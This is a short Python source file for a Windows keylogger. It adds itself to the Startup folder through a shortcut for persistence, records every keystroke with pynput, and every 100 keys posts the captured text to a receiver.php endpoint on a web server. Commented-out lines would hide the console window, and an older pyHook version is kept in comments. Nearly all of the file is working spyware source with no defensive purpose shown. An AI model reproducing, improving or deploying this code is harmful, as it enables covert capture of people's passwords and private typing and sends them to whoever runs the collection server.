# Python code for keylogger 
# to be used in windows
import win32console
#import pythoncom, pyHook 
  
win = win32console.GetConsoleWindow() 
#win32gui.ShowWindow(win, 0) 
from sys import argv 
import sys, os, winshell, win32com.client
from pathlib import Path



if (len(argv) > 1):
    srcFile = os.path.abspath(os.path.realpath(__file__))
    dstFolder = winshell.startup()
    dstShortcut = os.path.join(dstFolder, 'KeyLogger.lnk')
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(dstShortcut)
    shortcut.Targetpath = srcFile
    shortcut.save()

#network
import requests
# ONCE BUFFER FULL : SEND DATA TO SERVER
# def send_server() :
#     url = "http://localhost:81/Python_exe/receiver.php"
#     files = {'file':open("output.txt", 'rb')}

#     x = requests.post(url, files=files)
#     print(x.text)

def send_server_as_str(text) :
    url = "http://localhost:80/Python_exe/receiver.php"
    data = {'data':text}

    x = requests.post(url, data=data)
    print(x.text)


from pynput.keyboard import Key, Listener

with open("output.txt", "a+") as f:
    global data, counter
    data = ""
    counter = 0
    def on_press(key):
        global data
        global counter
        if(len(str(key))==3):
            #f.write(key.char)
            data += key.char
        else:
            #f.write(str(key))
            data += str(key)
        counter += 1
        if counter >= 100 :
            send_server_as_str(data)
            counter = 0

    def on_release(key):
        if key == Key.esc:
            # Stop listener
            send_server_as_str(data)
            return False

    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()




#win32gui.ShowWindow(win, 1) 

# def OnKeyboardEvent(event):
#     if event.Ascii==32: 

#         exit() 
#     # if event.Ascii !=0 or 8: 
#     # #open output.txt to read current keystrokes 
#     #     f = open('output.txt', 'r+') 
#     #     buffer = f.read() 
#     #     f.close() 
#     # # open output.txt to write current + new keystrokes 
#     # f = open('output.txt', 'w') 
#     # keylogs = chr(event.Ascii) 
#     # if event.Ascii == 13: 
#     #     keylogs = '/n'
#     #     buffer += keylogs 
#     #     f.write(buffer)
#     #     f.close() 


#     with open("output.txt", "w") as f:
#         keylogs = chr(event.Ascii)
#         f.write(keylogs)

# # create a hook manager object 
# hm = pyHook.HookManager() 
# hm.KeyDown = OnKeyboardEvent 
# # set the hook 
# hm.HookKeyboard() 
# # wait forever 
# pythoncom.PumpMessages() 
